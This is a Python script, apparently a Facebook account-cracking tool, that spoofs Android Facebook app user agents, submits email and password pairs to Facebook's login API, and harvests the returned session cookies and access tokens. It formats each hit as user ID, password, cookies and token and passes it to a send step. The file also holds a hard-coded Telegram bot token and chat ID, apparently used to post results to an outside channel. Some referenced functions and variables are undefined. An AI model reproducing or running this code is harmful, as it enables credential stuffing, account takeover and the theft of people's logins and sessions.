import random
import requests
def useragent():
    fbks = (
        'com.facebook.adsmanager', 'com.facebook.lite', 'com.facebook.orca', 'com.facebook.katana', 'com.facebook.mlite')
    enCRACK1 = ['en_GB', 'en_US']
    CRACKsim1 = ['Banglalink', 'Grameenphone', 'Robi', 'Airtel', 'Teletalk']
    modelxxx = [
        "2201116SI", "M2012K11AI", "22011119TI", "21091116UI", "M2102K1AC", "M2012K11I", "22041219I",
    ]
    gtt = random.choice(modelxxx)
    android_version = str(random.randint(6, 13))
    fbav = f"{random.randint(111, 111)}.{random.randint(111, 999)}.{random.randint(111, 999)}.{random.randint(111, 999)}"
    fbbv = str(random.randint(111111111, 999999999))
    lc = random.choice(enCRACK1)
    cr = random.choice(CRACKsim1)
    CRACK_ua = f'[FBAN/FB4A;FBAV/{fbav};FBBV/{fbbv};FBDM={{density=3.0,width=1280,height=1440}};FBLC/{lc};FBRV/0;FBCR/{cr};FBMF/Xiaomi;FBBD/Xiaomi;FBPN/com.facebook.katana;FBDV/{gtt};FBSV/{android_version};FBOP/19;FBCA/armeabi-v7a:armeabi;]'
    return CRACK_ua

def prin(message):
    """
    Send a formatted message to Telegram.
    """
    bot_token = "7696072927:AAHCieEIUD2UVr5alMwZqyIPhVGjPUqr3KU"  # Replace with your bot token
    chat_id = "7352132358"  # Replace with your chat ID
    telegram_url = f"https://api.telegram.org/bot{bot_token}/sendMessage"

    # Send the request to Telegram
    data = {
        "chat_id": chat_id,
        "text": message,
        "parse_mode": "HTML"  # Optional: Remove if you don't need HTML parsing
    }
    try:
        response = requests.post(telegram_url, data=data)
        if response.status_code == 200:
            print("Message sent to Telegram successfully!")
        else:
            print(f"Failed to send message. Status code: {response.status_code}, Response: {response.text}")
    except Exception as e:
        print("Error sending message to Telegram:", e)

def inc3_cookies(au, to):
    ugen = useragent()
    uuid = generate_udid()

    # Prepare data for the login request
    data = {"adid": uuid,
            "format": "json",
            "device_id": uuid,
            "cpl": "true",
            "family_device_id": uuid,
            "credentials_type": "device_based_login_password",
            "error_detail_type": "button_with_disabled",
            "source": "device_based_login",
            "email": au,
            "password": to,
            "access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
            "generate_session_cookies": "1",
            "meta_inf_fbmeta": "",
            "advertiser_id": uuid,
            "currently_logged_in_userid": "0",
            "locale": "en_GB",
            "client_country_code": "GB",
            "method": "auth.login",
            "fb_api_req_friendly_name": "authenticate",
            "fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
            "api_key": "882a8490361da98702bf97a021ddc14d"
            }

    headers = {
        'User-Agent': ugen,
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'graph.facebook.com',
        'X-FB-Net-HNI': str(random.randint(20000, 40000)),
        'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
        'X-FB-Connection-Type': 'MOBILE.LTE',
        'X-Tigon-Is-Retry': 'False',
        'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
        'x-fb-device-group': '5120',
        'X-FB-Friendly-Name': 'ViewerReactionsMutation',
        'X-FB-Request-Analytics-Tags': 'graphservice',
        'X-FB-HTTP-Engine': 'Liger',
        'X-FB-Client-IP': 'True',
        'X-FB-Server-Cluster': 'True',
        'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'
    }

    # Send login request
    req = requests.Session()
    response = req.post(url, data=data, headers=headers).json()

    # Print the response for debugging
    print("Response:", response)

    # Check if session cookies are present in the response
    if "session_cookies" in response:
        token = response["access_token"]
        ce = {cookie['name']: cookie['value'] for cookie in response['session_cookies']}

        # Print cookies for debugging
        print(token)
        print("Cookies:")
        for name, value in ce.items():
            print(f"{name}: {value}")

        # Check if c_user is present to verify successful login
        c_user = ce.get('c_user', '')
        if not c_user:
            return f"{au} {to} wrong pass"

        # Extract specific cookies
        datr = ce.get('datr', '')
        sb = ce.get('sb', '')
        xs = ce.get('xs', '')
        fr = ce.get('fr', '')

        # Create the cookie string in the specified format
        ces = f"datr={datr};sb={sb};c_user={c_user};xs={xs};fr={fr};m_page_voice={c_user}"

        # Handle checkpoint detection
        if 'checkpoint' in ces:
            return f"{au} {au} id in checkpoint"
        else:
            try:
                cookies = f"{c_user}|{to}|{ces}|{token}"
                send(cookies)
                return ces
            except Exception as e:
                print(f"Error sending cookies: {e}")
                return ces
    else:
        return f"{au} {to} login failed, no session cookies returned"






